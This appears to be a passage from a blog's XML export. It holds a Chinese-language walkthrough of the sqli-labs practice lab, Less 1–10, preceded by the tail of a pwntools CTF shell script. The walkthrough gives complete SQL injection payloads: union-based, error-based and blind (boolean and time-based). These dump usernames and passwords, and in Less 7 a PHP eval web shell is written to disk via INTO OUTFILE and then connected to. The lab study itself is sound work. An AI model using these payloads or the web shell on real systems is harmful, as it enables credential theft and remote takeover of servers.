class="hljs-built_in">len</span>(payload)  <br>p.sendline(payload)  <br><span class="hljs-comment">#get shell   </span><br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)   <br>p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)   <br>p.interactive()  <br><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli labs master 学习</title>
    <url>/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="sqli-labs-master-学习"><a class="markdownIt-Anchor" href="#sqli-labs-master-学习"></a> sqli labs master 学习</h1>
<h2 id="less-1"><a class="markdownIt-Anchor" href="#less-1"></a> Less 1</h2>
<p>1.首先判断注入点</p>
<p>在http请求后加上？id=1’ and 1=1 – -，显示如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p>
<p>把后面改为1=2显示如下，可以看到sql语句应该是正常执行了，没有报错</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p>
<p>可以说明存在字符型注入，猜测语句为select… where id=’’这样的语句。</p>
<p>接下来判断注入点</p>
<p>判断字段数</p>
<p>输入?id=1’ order by 3 – -时候会显示如下，说明内部字段数为3</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p>
<p>输入?id=0’ union select 1,2,3 – -回显如下</p>
<p>（id为0是为了不让返回值干扰注入）</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p>
<p>说明2,3的位置存在注入点</p>
<p>使用联合查询注入查看表，输入?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p>
<p>得到emails,referers,uagents,users这几个表</p>
<p>查询字段，输入?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’ – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image014.jpg" alt="img"></p>
<p>发现里面有username，password字段，可以尝试查询这个列里的值，输入?id=0’ union select 1,group_concat(username,0x3f,password),3 from users-- -</p>
<p>0x3f是？的ascii码值，放在中间作为参数好区分两个列的值</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p>
<h2 id="less-2"><a class="markdownIt-Anchor" href="#less-2"></a> Less 2</h2>
<p>首先查看注入类型，输入?id=1 and 1=1 – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image072.jpg" alt="img"></p>
<p>输入?id=1 and 1=2 – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image074.jpg" alt="img"></p>
<p>说明存在数字型注入，之后步骤同less1，输入的代码相同，如下</p>
<p>判断注入点，输入?id=1 order by 3 – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag06.jpg" alt="img"></p>
<p>回显如下，说明回显字段数为3，之后步骤同less1，可以使用less1的注入代码去掉前面单引号即可</p>
<p>最后输入输入?id=0 union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image708.jpg" alt="img"></p>
<h2 id="less-3"><a class="markdownIt-Anchor" href="#less-3"></a> Less 3</h2>
<p>先输入?id=1’，显示如下，根据报错信息，可以知道后面还有个括号，所以尝试输入?id=1’) and 1=1 – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image22.jpg" alt="img"></p>
<p>输入?id=1’) and 1=1 – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image044.jpg" alt="img"></p>
<p>说明存在基于字符’)的字符型注入</p>
<p>输入?id=1’) order by 3 – -回显如下，说明返回数据有3个字段</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imaw006.jpg" alt="img"></p>
<p>后面输入同less1，将less1的语句改为id=1’)即可</p>
<p>最后输入?id=0 union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码列对应的数值</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima008.jpg" alt="img"></p>
<h2 id="less-4"><a class="markdownIt-Anchor" href="#less-4"></a> Less 4</h2>
<p>输入?id=1’但是页面无变化</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_i.jpg" alt="img"></p>
<p>输入?id=1&quot;页面报错如下，猜测可能是双引号加）</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima.jpg" alt="img"></p>
<p>输入?id=1&quot;) order by 4 – -发现回显如下，说明我们的判断可能是对的</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag76.jpg" alt="img"></p>
<p>输入?id=1&quot;) order by 3 – -回显正常说明有3个字段</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ie008.jpg" alt="img"></p>
<p>之后注入代码同less1，id后面改为&quot;)其他同，最后得到用户名和密码的列内容为</p>
<p>输入</p>
<p>?id=0&quot;) union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码列对应的数值</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im.jpg" alt="img"></p>
<h2 id="less-5"><a class="markdownIt-Anchor" href="#less-5"></a> Less 5</h2>
<p>首先查询id=1，但是发现不会返回任何数据，只会返回you are in……</p>
<p>如果输入别的，就会报错</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image34.jpg" alt="img"></p>
<p>输入?id=1’ and 1=1 – -未报错，说明sql查询语句可能同less1使用‘号闭合</p>
<p>输入?id=1’ order by 3 – -，回显正常，说明字段数为3</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima344.jpg" alt="img"><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imageqew.jpg" alt="img"></p>
<p>使用报错注入查询数据库名，输入?id=0’union select count(*),1, concat(’~’,(select database()),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>原理：利用concat（）连接函数和随机数函数floor(rand()*2)的结果只能在0-1来产生报错，使用information_schema.tables 或 information_schema.columns者两个表来查询，然后就会产生很多结果达到报错concat函数加~号是为了能更好看清楚查询到的数据库</p>
<p>效果如下：可以知道查询到的数据库名是security</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im0.jpg" alt="img"></p>
<p>查询表名，输入</p>
<p>?id=0’ union select count(*),1, concat(’~’,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>从0开始输入到4的时候（limit 3，1前的数3表示第几个表），回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im10.jpg" alt="img"></p>
<p>说明数据库中第四个表为user</p>
<p>查询列字段名，输入?id=0’ union select count(*),1, concat(’~’,(select column_name from information_schema.columns where table_schema=‘security’ and table_name=‘users’ limit 0,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im1.jpg" alt="img"></p>
<p>说明表中第一个列的字段是id，同理可以找到username、password等字段</p>
<p>接下来查询内容，输入?id=0’ union select count(*),1, concat(’~’,( select username from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>和</p>
<p>?id=0’ union select count(*),1, concat(’~’,( select password from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image088.jpg" alt="img"></p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image8016.jpg" alt="img"></p>
<p>可以查找到Angelina的用户名和密码，查找其他账号密码方式同上</p>
<h2 id="less-6"><a class="markdownIt-Anchor" href="#less-6"></a> Less 6</h2>
<p>输入id=1回显如下，说明还是通过布尔值来判断注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image3002.jpg" alt="img"></p>
<p>尝试输入?id=1’，回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0044.jpg" alt="img"></p>
<p>输入?id=1&quot;报错如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00634.jpg" alt="img"></p>
<p>说明存在双引号的注入</p>
<p>使用报错注入查询数据库名，输入?id=0” union select count(*),1, concat(’~’,(select database()),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag32e008.jpg" alt="img"></p>
<p>可以通过报错注入回显出结果，其他步骤和payload同less5，使用less5的注入代码，并且把id=0后的单引号改为双引号即可</p>
<p>最后查询表中内容输入如下</p>
<p>接下来查询内容，输入?id=0&quot;union select count(*),1, concat(’~’,( select username from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>和</p>
<p>?id=0&quot; union select count(*),1, concat(’~’,( select password from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01045.jpg" alt="img"></p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01223.jpg" alt="img"></p>
<h2 id="less-7"><a class="markdownIt-Anchor" href="#less-7"></a> Less 7</h2>
<p>输入?id=1,?id=1’,?id=1&quot;测试注入点，当输入id=1’的时候报错，显示如下，说明存在单引号字符型注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01124.jpg" alt="img"></p>
<p>输入?id=1’ and 1=1 – - 报错，显示如下，说明可能存在括号</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01326.jpg" alt="img"></p>
<p>测试有多少个括号，最后输入?id=1’ )) and 1=1 – -未报错，显示如下，说明得需要2个括号闭合</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image011238.jpg" alt="img"></p>
<p>提示我们得使用outfile函数导出文件，然而这个函数是有要求的，首先我们得知道绝对的文件物理路径，还得对这个路径有可写入的权限</p>
<p>在地址栏输入</p>
<p>?id=1’)) union select 1,2,’<?php @eval($_POST["cmd"]);?>’ into outfile “D:\phpstudy_pro\WWW\sqli-labs-master\Less-7”-- -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image04220.gif" alt="img"></p>
<p>可以看到这个路径确实写入了我们的一句话木马，然后用菜刀连接</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image02322.gif" alt="img"></p>
<p>这时可以连接上并且可以对文件进行操作了</p>
<h2 id="less-8"><a class="markdownIt-Anchor" href="#less-8"></a> Less 8</h2>
<p>输入?id=1，回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image02302.jpg" alt="img"></p>
<p>可以说明是布尔型注入，输入?id=1’没有回显，说明可能是基于单引号的布尔注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00%E4%B8%BA4.jpg" alt="img"></p>
<p>尝试使用报错注入的时候没有回显，所以我们不能用报错注入。尝试时间盲注</p>
<p>输入?id=1’ and if(length(database())=8,sleep(5),1)-- -</p>
<p>*这里不正确执行select 1页面正常返回，正确则执行select sleep(5)页面沉睡5秒后返回</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00r36.jpg" alt="img"></p>
<p>有明显延迟，说明数据库长度为8，接下来爆破库名</p>
<p>?id=1’and if(ascii(substr(database(),1,1))=115,sleep(5),1)-- -</p>
<p>如下图，有明显延迟，说明库的第一个字符acii码为115（s）</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0sd208.jpg" alt="img"></p>
<p>其他字段调整(substr(database(),x,1)中x大小得出数据库名字是’security’</p>
<p>接下来爆破表的内容</p>
<p>?id=1’and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit 3,1),1,1))=117 ,sleep(5),1)-- -</p>
<p>这里limit x,1),y,1)的x表示第x+1个表，y表示表名第y位数，用ASCII码判断</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0102.jpg" alt="img"></p>
<p>延迟明显说明猜测正确，这里最后得出第三个表是user表</p>
<p>接下来爆表中的名字，输入</p>
<p>?id=1’and if(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 3,1),1,1))=105, sleep(5),1)-- -</p>
<p>这里limit x,1),y,1)的x表示第x+1列，y表示列名第y位数，用ASCII码判断</p>
<p>然后爆破列的内容用</p>
<p>?id=1’and if(ascii(substr((select username from users limit 0,1),1,1))=68, sleep(5),1) – -</p>
<p>这里limit x,1),y,1)的x表示第x+1个内容，y表示内容的第y位数，用ASCII码判断</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01342.jpg" alt="img"></p>
<p>请求有明显延迟则判断成功</p>
<h2 id="less-9"><a class="markdownIt-Anchor" href="#less-9"></a> Less 9</h2>
<p>这里不管输入什么，下图输入1或者1’，回显总是You are in…</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image32014.jpg" alt="img"><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag3e016.jpg" alt="img"></p>
<p>题目提示是基于时间的盲注，经过尝试，当输入?id=1’ and sleep(5) – -延迟明显，说明注入成功</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_23image018.jpg" alt="img"></p>
<p>由于我们上一关就是使用的时间盲注，所以直接用上一题的payload</p>
<p>输入?id=1’ and if(length(database())=8,sleep(5),1)-- -，查询数据库长度</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image3020.jpg" alt="img"></p>
<p>延迟明显，说明可以注入，之后操作同less8</p>
<h2 id="less-10"><a class="markdownIt-Anchor" href="#less-10"></a> Less 10</h2>
<p>这里和上一关一样，不管输入什么都会显示you are in….，通过测试，当输入?id=1&quot; and sleep(5) – -时，延迟明显，说明存在双引号注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image123022.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>web学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
      </tags>
  </entry>
</search>
